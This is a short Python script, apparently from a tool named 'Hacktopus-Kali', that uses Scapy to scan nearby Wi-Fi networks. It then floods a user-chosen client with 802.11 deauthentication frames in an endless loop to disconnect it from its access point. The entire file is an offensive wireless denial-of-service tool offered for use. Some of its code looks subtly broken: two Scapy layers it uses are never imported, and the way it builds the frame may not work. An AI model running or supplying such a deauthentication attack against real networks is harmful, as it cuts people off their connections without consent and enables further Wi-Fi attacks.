import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Deauth
import time

def deauth(target_mac, gateway_mac, interface):
    print("\n🔍 Sending deauthentication packets...")
    
    #deauth packet
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = Dot11Deauth(dot11, reason=7)
    
    while True:
        scapy.sendp(packet, iface=interface, count=100, inter=0.1, verbose=True)
        print(f"Sent deauth packet to {target_mac}")
        time.sleep(1)

def scan_network(interface):
    print("\n🔍 Scanning networks to find BSSID and clients...")
    
    scapy.sniff(iface=interface, prn=handle_packet, timeout=10)

def handle_packet(packet):
    if packet.haslayer(Dot11Beacon):
        ssid = packet[Dot11Elt].info.decode()
        bssid = packet[Dot11].addr3
        print(f"Found Wi-Fi network: SSID: {ssid} BSSID: {bssid}")

def main():
    print("🎩 Hacktopus-Kali - Wireless Network Deauthenticator")
    interface = input("Enter the interface for Wi-Fi (e.g., wlan0): ")
    scan_network(interface)
    target_mac = input("Enter the target MAC address to disconnect: ")
    gateway_mac = input("Enter the BSSID (Access Point MAC): ")
    deauth(target_mac, gateway_mac, interface)

if __name__ == "__main__":
    main()

